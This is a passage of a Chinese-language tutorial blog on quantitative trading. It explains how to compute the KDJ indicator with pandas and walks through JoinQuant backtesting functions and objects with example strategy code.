</thead>
<tbody><tr>
<td>RSV</td>
<td>未成熟随机指标值</td>
<td>(Cn - Ln) &#x2F; (Hn - Ln) × 100 (N日)</td>
</tr>
<tr>
<td>K</td>
<td>当天K值</td>
<td>2&#x2F;3×前一日K值 + 1&#x2F;3×当日RSV</td>
</tr>
<tr>
<td>D</td>
<td>当天D值</td>
<td>2&#x2F;3×前一日D值 + 1&#x2F;3×当日K值</td>
</tr>
<tr>
<td>J</td>
<td>当天J值</td>
<td>3<em>当日K值 - 2</em>当日D值</td>
</tr>
<tr>
<td>备注</td>
<td>若无前一日K值与D值，则可分别用50来代替</td>
<td></td>
</tr>
</tbody></table>
<p>**rolloing：**Pandas中移动窗口函数，每个窗口都是指定的固定大小，快捷计算Ln与Hn</p>
<p><strong>expanding</strong>:  在Pandas中扩展窗口函数，只设置最小的观察值数量，不固定窗口大小，实现累积计算，即不断扩展，使用<code>expanding().max()</code>可以创建新的高度。</p>
<p>code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> colors <span class="keyword">as</span> mycolors</span><br><span class="line"><span class="keyword">from</span> matplotlib.collections <span class="keyword">import</span> LineCollection,PolyCollection</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unittest <span class="keyword">import</span> TestCase</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestKDJ</span>(<span class="title class_ inherited__">TestCase</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cal_kdj</span>(<span class="params">self,df</span>):</span><br><span class="line">        <span class="comment">#计算Ln</span></span><br><span class="line">        low_list = df[<span class="string">&#x27;low&#x27;</span>].rolling(<span class="number">9</span>, min_periods=<span class="number">9</span>).<span class="built_in">min</span>()</span><br><span class="line">        low_list.fillna(value=df[<span class="string">&#x27;low&#x27;</span>].expanding().<span class="built_in">min</span>(),inplace=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># Hn</span></span><br><span class="line">        high_list = df[<span class="string">&#x27;high&#x27;</span>].rolling(<span class="number">9</span>, min_periods=<span class="number">9</span>).<span class="built_in">max</span>()</span><br><span class="line">        high_list.fillna(value=df[<span class="string">&#x27;high&#x27;</span>].expanding().<span class="built_in">max</span>(),inplace=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># rsv</span></span><br><span class="line">        rsv = (df[<span class="string">&#x27;close&#x27;</span>] - low_list)/(high_list - low_list)*<span class="number">100</span></span><br><span class="line">        df[<span class="string">&#x27;k&#x27;</span>] = pd.DataFrame(rsv).ewm(com=<span class="number">2</span>).mean()</span><br><span class="line">        df[<span class="string">&#x27;d&#x27;</span>] = df[<span class="string">&#x27;k&#x27;</span>].ewm(com=<span class="number">2</span>).mean()</span><br><span class="line">        df[<span class="string">&#x27;j&#x27;</span>] = <span class="number">3</span>*df[<span class="string">&#x27;k&#x27;</span>] - <span class="number">2</span>*df[<span class="string">&#x27;d&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> df</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_kdj</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        df = pd.read_csv(file_name)</span><br><span class="line">        df.columns = [<span class="string">&#x27;ts_code&#x27;</span>, <span class="string">&#x27;trade_date&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;volume&#x27;</span>]</span><br><span class="line">        df = df[[<span class="string">&#x27;trade_date&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;volume&#x27;</span>]]</span><br><span class="line">        df[<span class="string">&quot;trade_date&quot;</span>] = pd.to_datetime(df[<span class="string">&quot;trade_date&quot;</span>])</span><br><span class="line"></span><br><span class="line">        df_kdj = <span class="variable language_">self</span>.cal_kdj(df)</span><br><span class="line">        <span class="built_in">print</span>(df_kdj)</span><br><span class="line"></span><br><span class="line">        plt.figure()</span><br><span class="line">        df_kdj[<span class="string">&#x27;k&#x27;</span>].plot(color=<span class="string">&#x27;red&#x27;</span>,label=<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">        df_kdj[<span class="string">&#x27;d&#x27;</span>].plot(color=<span class="string">&#x27;yellow&#x27;</span>,label=<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">        df_kdj[<span class="string">&#x27;j&#x27;</span>].plot(color=<span class="string">&#x27;blue&#x27;</span>,label=<span class="string">&#x27;j&#x27;</span>)</span><br><span class="line">        plt.legend(loc=<span class="string">&#x27;best&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        major_index = df_kdj.index[df_kdj.index]</span><br><span class="line">        major_xtics = df_kdj[<span class="string">&#x27;trade_date&#x27;</span>][df_kdj.index]</span><br><span class="line">        plt.xticks(major_index,major_xtics)</span><br><span class="line">        plt.setp(plt.gca().get_xticklabels(), rotation=<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">        plt.grid(linestyle=<span class="string">&#x27;-.&#x27;</span>)</span><br><span class="line">        plt.title(<span class="string">&#x27;KDJ&#x27;</span>)</span><br><span class="line">        plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">        plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;SimHei&#x27;</span>]</span><br><span class="line">        plt.show()</span><br></pre></td></tr></table></figure>

<h1 id="量化交易策略框架"><a href="#量化交易策略框架" class="headerlink" title="量化交易策略框架"></a>量化交易策略框架</h1><p>主力做局散户没法准确知道，但可以一招破解：（图中白色均线为MA5，紫红色均线为MA20，你对照一下上面的图线）只买MA20上涨+MA5在MA20以上的+MA5上涨的股票，凡是买入后某天开盘后下跌3.8%的一律不计条件出局，或者MA5跌到MA20以下一律出局，或者MA20向下运动一律出局。这样每一只股总能吃到主体利润，下跌只有轻微损失，不会上主力的当！淋过雨的人，才会想到别人淋雨的感受，切记！</p>
<h2 id="策略框架"><a href="#策略框架" class="headerlink" title="策略框架"></a>策略框架</h2><p>**框架：**初始化+策略函数（周期循环）</p>
<p><strong>初始化:<strong>通过初始化函数设置基准。初始化函数在整个回测或者实盘操作中只被运行一次，用于</strong>初始化全局变量</strong></p>
<p>函数：initialize(context)</p>
<p>context : Context对象，存放有当前的账户&#x2F;股票持仓信息</p>
<p>示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>:</span><br><span class="line">    <span class="comment"># g为全局变量，设定标的股票为深交所的平安银行</span></span><br><span class="line">    g.security = <span class="string">&quot;000001.XSHE&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>策略函数：<strong>策略开始后，随着时间周期</strong>重复执行你的交易策略</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">handle_data</span>(<span class="params">context,data</span>):</span><br><span class="line">    <span class="comment"># 下单一千股</span></span><br><span class="line">    order(g.security, <span class="number">1000</span>)</span><br><span class="line">    <span class="comment"># 卖出八百股</span></span><br><span class="line">    order(g.security, -<span class="number">800</span>)</span><br></pre></td></tr></table></figure>

<p>order()聚宽的api</p>
<p>示例：</p>
<ul>
<li>初始化中要有股票和策略运行周期</li>
<li>策略函数：<ul>
<li>如果上一时间点价格高出五天平均价1%，则全仓买入</li>
<li>如果上一时间点价格低于五天平均价，则空仓卖入（画出上一时间点价格）</li>
</ul>
</li>
</ul>
<p>基础框架：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *  <span class="comment"># 必需导入聚宽库</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    g.security = <span class="string">&quot;000001.XSHE&quot;</span>  <span class="comment"># 深交所平安银行</span></span><br><span class="line">    run_daily(market_open, time=<span class="string">&#x27;every_bar&#x27;</span>)  <span class="comment"># 每次Bar执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">market_open</span>(<span class="params">context</span>):</span><br><span class="line">    security = g.security</span><br><span class="line">    close_data = attribute_history(security, <span class="number">5</span>, <span class="string">&#x27;1d&#x27;</span>, [<span class="string">&#x27;close&#x27;</span>])  <span class="comment"># 获取5日收盘价</span></span><br><span class="line">    MA5 = close_data[<span class="string">&#x27;close&#x27;</span>].mean()  <span class="comment"># 5日均线</span></span><br><span class="line">    current_price = close_data[<span class="string">&#x27;close&#x27;</span>][-<span class="number">1</span>]  <span class="comment"># 当前价格</span></span><br><span class="line">    </span><br><span class="line">    cash = context.portfolio.available_cash  <span class="comment"># 修正拼写</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 买入逻辑：价格突破均线1%</span></span><br><span class="line">    <span class="keyword">if</span> current_price &gt; <span class="number">1.01</span> * MA5:</span><br><span class="line">        order_value(security, cash)  <span class="comment"># 全仓买入</span></span><br><span class="line">        log.info(<span class="string">&quot;买入 %s&quot;</span> % security)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 卖出逻辑：价格低于均线且持有可卖数量</span></span><br><span class="line">    <span class="keyword">elif</span> current_price &lt; MA5 <span class="keyword">and</span> context.portfolio.positions[security].closeable_amount &gt; <span class="number">0</span>:</span><br><span class="line">        order_target(security, <span class="number">0</span>)  <span class="comment"># 清仓卖出</span></span><br><span class="line">        log.info(<span class="string">&quot;卖出 %s&quot;</span> % security)</span><br><span class="line">        </span><br><span class="line">    record(stock_price=current_price)  <span class="comment"># 记录股价</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>这个策略则垃圾不要随便用</p>
</blockquote>
<h2 id="设置函数"><a href="#设置函数" class="headerlink" title="设置函数"></a>设置函数</h2><p><strong>策略设置函数</strong></p>
<ul>
<li>基准：设定业绩比较基准：set_benchmark(security)</li>
<li>佣金&#x2F;印花税：set_order_cost(cost,type,ref&#x3D;None)</li>
<li>滑点：真是成交价格与下单时预期的价格偏差，set_slippage(object,type&#x3D;None,ref&#x3D;None)</li>
<li>成交量比例：根据实际行情限制每个订单的成交量，set_option(‘order_volume_ratio’,value)</li>
<li>动态复权模式：设置真实价格，建议开启，set_option(‘use_real_option’,value)</li>
</ul>
<p>这几个函数的使用</p>
<p>code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *  <span class="comment"># 必需导入聚宽库</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定业绩比较基准</span></span><br><span class="line">    set_benchmark(<span class="string">&#x27;000300.XSHG&#x27;</span>)</span><br><span class="line">    g.security = <span class="string">&quot;000001.XSHE&quot;</span>  <span class="comment"># 深交所平安银行</span></span><br><span class="line">    run_daily(market_open, time=<span class="string">&#x27;10:30&#x27;</span>)  <span class="comment"># 每次Bar执行</span></span><br><span class="line">    <span class="comment">#设置佣金，税率</span></span><br><span class="line">    set_order_cost(OrderCost(open_commission=<span class="number">0.03</span>,close_commission=<span class="number">0.03</span>,close_tax=<span class="number">0.001</span>),<span class="built_in">type</span>=<span class="string">&#x27;stock&#x27;</span>)</span><br><span class="line">    set_slippage(PriceRelatedSlippage(<span class="number">0.002</span>),<span class="built_in">type</span>=<span class="string">&#x27;stock&#x27;</span>)</span><br><span class="line">    <span class="comment">#成交量不足50%</span></span><br><span class="line">    set_option(<span class="string">&#x27;order_volume_ratio&#x27;</span>,<span class="number">0.5</span>)</span><br><span class="line">    <span class="comment">#复权</span></span><br><span class="line">    set_option(<span class="string">&#x27;use_real_price&#x27;</span>,<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">market_open</span>(<span class="params">context</span>):</span><br><span class="line">    security = g.security</span><br><span class="line">    close_data = attribute_history(security, <span class="number">5</span>, <span class="string">&#x27;1d&#x27;</span>, [<span class="string">&#x27;close&#x27;</span>])  <span class="comment"># 获取5日收盘价</span></span><br><span class="line">    MA5 = close_data[<span class="string">&#x27;close&#x27;</span>].mean()  <span class="comment"># 5日均线</span></span><br><span class="line">    current_price = close_data[<span class="string">&#x27;close&#x27;</span>][-<span class="number">1</span>]  <span class="comment"># 当前价格</span></span><br><span class="line">    </span><br><span class="line">    cash = context.portfolio.available_cash  <span class="comment"># 修正拼写</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 买入逻辑：价格突破均线1%</span></span><br><span class="line">    <span class="keyword">if</span> current_price &gt; <span class="number">1.01</span> * MA5:</span><br><span class="line">        order_value(security, cash)  <span class="comment"># 全仓买入</span></span><br><span class="line">        log.info(<span class="string">&quot;买入 %s&quot;</span> % security)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 卖出逻辑：价格低于均线且持有可卖数量</span></span><br><span class="line">    <span class="keyword">elif</span> current_price &lt; MA5 <span class="keyword">and</span> context.portfolio.positions[security].closeable_amount &gt; <span class="number">0</span>:</span><br><span class="line">        order_target(security, <span class="number">0</span>)  <span class="comment"># 清仓卖出</span></span><br><span class="line">        log.info(<span class="string">&quot;卖出 %s&quot;</span> % security)</span><br><span class="line">        </span><br><span class="line">    record(stock_price=current_price)  <span class="comment"># 记录股价</span></span><br></pre></td></tr></table></figure>

<h2 id="定时函数"><a href="#定时函数" class="headerlink" title="定时函数"></a>定时函数</h2><p>作用：设定<strong>回测</strong>和<strong>模拟交易</strong>中运行时间及频率</p>
<ul>
<li>月度：run_monthly(func,monthday,time&#x3D;’open’,reference_security)</li>
<li>周度：run_weekly(func,weekday,time&#x3D;’open’,reference_security)</li>
<li>日度：run_daily(func,time&#x3D;’open’,reference_security)</li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>介绍</th>
</tr>
</thead>
<tbody><tr>
<td>func</td>
<td>用户自定义接受 <code>context</code> 参数的函数，必须是全局函数</td>
</tr>
<tr>
<td>monthday</td>
<td>指定每月的第几个交易日执行函数。当值为负数时，表示在月末第几个交易日执行函数</td>
</tr>
<tr>
<td>time</td>
<td>字符串格式，支持 <code>time</code> 表达式，例如：‘9:30’</td>
</tr>
<tr>
<td>reference_security</td>
<td>表示时间的参照指标。如按照 “000001.XSHE” 交易时间</td>
</tr>
</tbody></table>
<h2 id="交易函数"><a href="#交易函数" class="headerlink" title="交易函数"></a>交易函数</h2><p>交易函数：<code>order(security,amount,style=None,side=&#39;long&#39;,pindex=0)</code></p>
<ul>
<li>security：股票代码</li>
<li>amount：交易数量（负数表示卖出）</li>
<li>styple：下单类型</li>
<li>side：short空（一般不允许）&#x2F; long多</li>
<li>pindex：仓位号，默认为0</li>
</ul>
<p>股票价值：<code>order_value(security,value,style=None,side=&#39;long&#39;,pindex=0)</code></p>
<ul>
<li>security：股票代码</li>
<li>value：交易数量（负数表示卖出）</li>
<li>styple：下单类型</li>
<li>side：short空（一般不允许）&#x2F; long多</li>
<li>pindex：仓位号，默认为0</li>
</ul>
<p>目标数量：<code>order(security,amount,style=None,side=&#39;long&#39;,pindex=0,close_today=False)</code></p>
<ul>
<li>security：股票代码</li>
<li>amount：交易数量（负数表示卖出）</li>
<li>styple：下单类型</li>
<li>side：short空（一般不允许）&#x2F; long多</li>
<li>pindex：仓位号，默认为0</li>
</ul>
<p>成交订单：<code>get_orders(order_id=None,security=None,status=None)</code></p>
<ul>
<li>get_orders(order_id&#x3D;’123’) 订单id查询订单号为’123’的订单</li>
<li>get_orders(security&#x3D;’000001.XSHE’) 查询所有标的为000001.XSHE的订单</li>
</ul>
<p>未完成订单：<code>get_open_orders()</code></p>
<p>在每天交易结束后获取当天所有未完成订单</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">after_market_close</span>(<span class="params">context</span>):</span><br><span class="line">    orders = get_open_orders()</span><br><span class="line">    <span class="keyword">for</span> _order <span class="keyword">in</span> orders:</span><br><span class="line">        log.info(_order.order_id)</span><br></pre></td></tr></table></figure>

<p>撤单函数：<code>cancel_order(order)</code></p>
<p>在每天交易结束后对当天所有未完成订单撤单</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">after_market_close</span>(<span class="params">context</span>):</span><br><span class="line">    orders = get_open_orders()</span><br><span class="line">    <span class="keyword">for</span> _order <span class="keyword">in</span> orders:</span><br><span class="line">        cancel_order(_order)</span><br></pre></td></tr></table></figure>

<p>账户出入金（充钱）：<code>inout_cash(cash,pindex=0)</code></p>
<ul>
<li>cash：浮点数，负数表示出金</li>
<li>pindex：仓位号，默认为0</li>
</ul>
<p>向账户增加10000元，inout_cash(10000,pindex&#x3D;0)</p>
<p>示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *  <span class="comment"># 必需导入聚宽库</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定业绩比较基准</span></span><br><span class="line">    set_benchmark(<span class="string">&#x27;000300.XSHG&#x27;</span>)</span><br><span class="line">    g.security = <span class="string">&quot;000001.XSHE&quot;</span>  <span class="comment"># 深交所平安银行</span></span><br><span class="line">    run_daily(market_open, time=<span class="string">&#x27;9:30&#x27;</span>)</span><br><span class="line">    run_daily(after_market_close, time=<span class="string">&#x27;15:30&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">market_open</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#先向账户里面增加10000</span></span><br><span class="line">    inout_cash(<span class="number">10000</span>, pindex=<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#查询可用资金</span></span><br><span class="line">    log.info(<span class="string">&quot;&quot;&quot;资金：&#123;&#125;&quot;&quot;&quot;</span>.<span class="built_in">format</span>(context.portfolio.subportfolios[<span class="number">0</span>].available_cash))</span><br><span class="line">    <span class="comment">#获取账户当前现金</span></span><br><span class="line">    cash = context.portfolio.available_cash</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#如果没有仓位</span></span><br><span class="line">    <span class="keyword">if</span> g.security <span class="keyword">not</span> <span class="keyword">in</span> context.portfolio.positions:</span><br><span class="line">        <span class="comment">#买入</span></span><br><span class="line">        order(g.security,<span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#卖出</span></span><br><span class="line">        order(g.security,-<span class="number">500</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after_market_close</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#获取当天所有未完成订单</span></span><br><span class="line">    orders = get_open_orders()</span><br><span class="line">    <span class="keyword">for</span> _order <span class="keyword">in</span> orders:</span><br><span class="line">        log.info(<span class="string">f&quot;&quot;&quot;未完成订单:<span class="subst">&#123;_order&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#对未完成订单进行撤单</span></span><br><span class="line">    <span class="keyword">for</span> _order <span class="keyword">in</span> orders:</span><br><span class="line">        cancel_order(_order)</span><br><span class="line">        log.info(<span class="string">f&quot;&quot;&quot;撤单:<span class="subst">&#123;_order&#125;</span>&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="交易对象"><a href="#交易对象" class="headerlink" title="交易对象"></a>交易对象</h2><p>**order对象：**订单处理流程</p>
<p>订单创建–&gt;订单检查–&gt;报单–&gt;确认委托–&gt;撮合</p>
<ul>
<li>cummission：交易费用</li>
<li>is_buy：bool值，买还是卖</li>
<li>status：状态，一个OrderStatus值</li>
<li>price：平均成交价的</li>
</ul>
<p>code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定业绩比较基准</span></span><br><span class="line">    set_benchmark(<span class="string">&#x27;000300.XSHG&#x27;</span>)</span><br><span class="line">    g.security = <span class="string">&quot;000001.XSHE&quot;</span>  <span class="comment"># 深交所平安银行</span></span><br><span class="line">    run_weekly(market_open,<span class="number">1</span>,time=<span class="string">&#x27;open&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">market_open</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#如果没有持仓</span></span><br><span class="line">    <span class="keyword">if</span> g.security <span class="keyword">not</span> <span class="keyword">in</span> context.portfolio.positions:</span><br><span class="line">        orders = order(g.security,<span class="number">100</span>)</span><br><span class="line">        <span class="built_in">print</span>(orders)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> orders <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;创建订单失败...&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;交易费用：<span class="subst">&#123;orders.commission&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;是否买单：<span class="subst">&#123;orders.is_buy&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;订单状态：<span class="subst">&#123;orders.status&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;订单平均成交价：<span class="subst">&#123;orders.price&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        order(g.security,-<span class="number">800</span>)</span><br></pre></td></tr></table></figure>

<p>**trade对象：**订单成交相关信息</p>
<ul>
<li>time：交易时间,[datetime.datetime]对象</li>
<li>security：标的代码</li>
<li>amount：交易数量</li>
<li>price：交易价格</li>
<li>trade_id：交易记录id</li>
<li>order_id：对应的订单id</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定业绩比较基准</span></span><br><span class="line">    set_benchmark(<span class="string">&#x27;000300.XSHG&#x27;</span>)</span><br><span class="line">    g.security = <span class="string">&quot;000001.XSHE&quot;</span>  <span class="comment"># 深交所平安银行</span></span><br><span class="line">    run_daily(market_open,time=<span class="string">&#x27;9:30&#x27;</span>)</span><br><span class="line">    run_daily(after_market_close, time=<span class="string">&#x27;15:30&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">market_open</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#如果没有持仓</span></span><br><span class="line">    <span class="keyword">if</span> g.security <span class="keyword">not</span> <span class="keyword">in</span> context.portfolio.positions:</span><br><span class="line">        orders = order(g.security,<span class="number">100</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#卖出800股</span></span><br><span class="line">        order(g.security,-<span class="number">800</span>)</span><br><span class="line">                </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after_market_close</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;闭市后&quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="comment">#得到所有的成交记录</span></span><br><span class="line">    trades = get_trades()</span><br><span class="line">    <span class="keyword">for</span> _trade <span class="keyword">in</span> trades.values():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;成交记录：<span class="subst">&#123;_trade&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;成交时间：<span class="subst">&#123;_trade.time&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;对应的订单id：<span class="subst">&#123;_trade.order_id&#125;</span>&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="策略信息"><a href="#策略信息" class="headerlink" title="策略信息"></a>策略信息</h2><p>**Context对象:**策略信息总览，包含账户、时间等信息</p>
<ul>
<li><strong>subportfolios</strong>: 当前单个操作仓位的资金、标的信息，是一个 <code>SubPortfolio</code> 的数组。</li>
<li><strong>portfolio</strong>: 账户信息，即 <code>subportfolios</code> 的汇总信息，<code>Portfolio</code> 对象，单个操作仓位时，<code>portfolio</code> 指向 <code>subportfolios[0]</code>。</li>
<li><strong>current_dt</strong>: 当前单位时间的开始时间，[datetime.datetime] 对象。</li>
<li><strong>previous_date</strong>: 前一个交易日，[datetime.date] 对象，注意这是一个日期，是 <code>date</code>，而不是 <code>datetime</code>。</li>
<li><strong>universe</strong>: 查询 <code>set_universe()</code> 设置的股票池，比如： <code>[&#39;000001.XSHE&#39;, &#39;600000.XSHG&#39;]</code>。</li>
</ul>
<p>code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定业绩比较基准</span></span><br><span class="line">    set_benchmark(<span class="string">&#x27;000300.XSHG&#x27;</span>)</span><br><span class="line">    g.security = <span class="string">&quot;000001.XSHE&quot;</span>  <span class="comment"># 深交所平安银行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_data</span>(<span class="params">context, data</span>):</span><br><span class="line">    <span class="comment">#context.portflio变为整数1</span></span><br><span class="line">    context.portfolio = <span class="number">1</span></span><br><span class="line">    log.info(context.portfolio)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#回复系统变量</span></span><br><span class="line">    <span class="keyword">del</span> context.portfolio</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#context.portfolio将变为用户账户信息</span></span><br><span class="line">    log.info(context.portfolio.total_value)</span><br><span class="line">------------------------------------------------------</span><br><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定业绩比较基准</span></span><br><span class="line">    set_benchmark(<span class="string">&#x27;000300.XSHG&#x27;</span>)</span><br><span class="line">    g.security = <span class="string">&quot;000001.XSHE&quot;</span>  <span class="comment"># 深交所平安银行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_data</span>(<span class="params">context, data</span>):</span><br><span class="line">    <span class="comment">#输出账户总资产</span></span><br><span class="line">    log.info(context.portfolio.total_value)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#输出持仓金额</span></span><br><span class="line">    log.info(context.portfolio.positions_value)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#输出今日日期</span></span><br><span class="line">    log.info(context.current_dt.day)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#输出总权益的累计收益</span></span><br><span class="line">    log.info(context.portfolio.returns)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#获取仓位subportfolios[0]的可用资金</span></span><br><span class="line">    log.info(context.subportfolios[<span class="number">0</span>].available_cash)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>**Position对象：**输出持有的标的信息</p>
<ul>
<li><strong>security</strong>: 标的的代码。</li>
<li><strong>price</strong>: 最新行情价格。</li>
<li><strong>total_amount</strong>: 总合计，不包括挂单冻结仓位。</li>
<li><strong>init_time</strong>: 建仓时间，格式为 <code>datetime.datetime</code>。</li>
</ul>
<p>code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定业绩比较基准</span></span><br><span class="line">    set_benchmark(<span class="string">&#x27;000300.XSHG&#x27;</span>)</span><br><span class="line">    g.security = <span class="string">&quot;000001.XSHE&quot;</span>  <span class="comment"># 深交所平安银行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_data</span>(<span class="params">context, data</span>):</span><br><span class="line">    <span class="comment">#如果没有持仓</span></span><br><span class="line">    <span class="keyword">if</span> g.security <span class="keyword">not</span> <span class="keyword">in</span> context.portfolio.positions:</span><br><span class="line">        <span class="comment">#下单1000股</span></span><br><span class="line">        order(g.security,<span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#卖出800股</span></span><br><span class="line">        order(g.security,-<span class="number">800</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span 